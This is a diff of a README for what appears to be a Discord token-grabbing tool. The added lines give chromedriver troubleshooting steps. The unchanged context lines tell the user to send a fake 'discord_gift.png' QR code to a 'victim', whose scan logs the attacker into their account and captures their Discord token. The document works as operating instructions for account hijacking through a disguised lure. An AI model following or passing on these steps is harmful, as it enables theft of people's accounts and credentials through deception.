@@ -16,3 +16,14 @@ the installation.
 4. Wait for the `discord_gift.png` to be generated. Send the image to the victim and make them scan it.
 
 5. When the QR Code is scanned, you will automatically be logged in to their account and the script will grab the Discord token.
+
+## Troubleshoot
+Make sure your chromedriver.exe file is the same version as your current Chrome web browser version. To check your current Chrome version,
+paste `chrome://settings/help` in Google Chrome.
+
+if Chrome crashes,
+
+1. Make sure your chromedriver.exe file is the same version as your Chrome web browser version
+2. Download the latest version chromedriver.exe here: https://chromedriver.chromium.org/downloads
+3. Then replace the chromedriver.exe file in the folder.
+
